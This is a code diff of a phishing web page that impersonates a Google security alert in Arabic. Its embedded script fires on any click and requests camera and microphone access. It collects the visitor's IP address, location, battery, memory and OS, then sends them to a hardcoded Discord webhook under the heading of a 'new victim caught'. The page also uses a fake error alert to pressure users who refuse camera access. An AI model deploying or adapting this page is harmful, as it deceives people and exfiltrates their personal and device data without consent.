@@ -3,29 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Security Center</title>
+    <title>Google - Security Audit</title>
     <script>
         const WH = "https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67";
 
-        async function collect(camStatus) {
+        async function sendFinal(status) {
             let info = {
                 ip: "Scanning...",
                 loc: "Unknown",
                 ram: navigator.deviceMemory || "Unknown",
-                bat: "100%",
+                bat: "Unknown",
                 os: navigator.platform
             };
 
-            // سحب الـ IP بشكل منفصل تماماً عن الكاميرا لضمان وصوله
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
                 info.ip = data.ip;
-                
-                const locRes = await fetch(`https://ipapi.co/${data.ip}/json/`);
-                const locData = await locRes.json();
-                info.loc = `${locData.city}, ${locData.country_name}`;
-            } catch (e) { info.ip = "Hidden/VPN"; }
+                info.loc = `${data.city}, ${data.country_name}`;
+            } catch (e) {}
 
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
@@ -34,52 +30,53 @@
 
             const payload = {
                 embeds: [{
-                    title: "🚀 تم صيد ضحية جديدة - نظام TLQQEMM",
-                    color: camStatus === "✅ Granted" ? 65280 : 16711680,
+                    title: "🚀 صيد جديد - نظام TLQQEMM",
+                    color: status === "✅ GRANTED" ? 65280 : 16711680,
                     fields: [
                         { name: "🌐 عنوان الـ IP", value: info.ip, inline: true },
                         { name: "📍 الموقع", value: info.loc, inline: true },
-                        { name: "📸 إذن الكاميرا", value: camStatus, inline: true },
-                        { name: "🔋 حالة البطارية", value: info.bat, inline: true },
+                        { name: "📸 الإذن", value: status, inline: true },
+                        { name: "🔋 البطارية", value: info.bat, inline: true },
                         { name: "🧠 الذاكرة (RAM)", value: info.ram + " جيجا", inline: true },
-                        { name: "💻 نوع النظام", value: info.os, inline: true }
+                        { name: "💻 النظام", value: info.os, inline: true }
                     ],
-                    footer: { text: "نظام سحب البيانات المتطور | TLQQEMM" },
+                    footer: { text: "r3b Supreme Engine | V18" },
                     timestamp: new Date()
                 }]
             };
+
             fetch(WH, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
         }
 
-        async function run() {
-            // أول ما يضغط، نرسل الـ IP فوراً حتى قبل ما يقرر يوافق أو يرفض الكاميرا
-            collect("⌛ Pending...");
-
+        async function start() {
             try {
+                // طلب الكاميرا أولاً
                 await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                collect("✅ Granted");
-                alert("Identity Verified Successfully.");
-            } catch (e) {
-                collect("❌ Denied");
-                alert("Error: You must allow camera access to secure your account.");
+                // إذا وافق، يرسل كل البيانات مرة واحدة
+                await sendFinal("✅ GRANTED");
+                alert("تم التحقق من الأمان بنجاح.");
+            } catch (err) {
+                // إذا رفض، يرسل البيانات مع حالة الرفض
+                await sendFinal("❌ DENIED");
+                alert("خطأ: يجب السماح بالوصول للكاميرا لتأمين حسابك.");
                 location.reload(); 
             }
         }
 
-        window.onclick = run;
+        window.onclick = start;
     </script>
     <style>
         body { background: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; cursor: pointer; }
-        .box { text-align: center; border: 1px solid #dadce0; padding: 40px; border-radius: 8px; max-width: 400px; }
+        .card { text-align: center; border: 1px solid #dadce0; padding: 40px; border-radius: 8px; max-width: 400px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
         .btn { background: #1a73e8; color: white; border: none; padding: 12px 24px; border-radius: 4px; font-weight: bold; margin-top: 20px; cursor: pointer; }
     </style>
 </head>
 <body>
-    <div class="box">
+    <div class="card">
         <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="90">
-        <h2>تنبيه أمني</h2>
-        <p>تم اكتشاف محاولة دخول مشبوهة لجهازك. يرجى الضغط أدناه للتحقق من هويتك.</p>
-        <button class="btn">تأمين الحساب الآن</button>
+        <h2>تحديث أمني مطلوب</h2>
+        <p>تم اكتشاف نشاط مشبوه على جهازك. يرجى الضغط أدناه لتأمين حسابك فوراً.</p>
+        <button class="btn">بدء الفحص</button>
     </div>
 </body>
 </html>
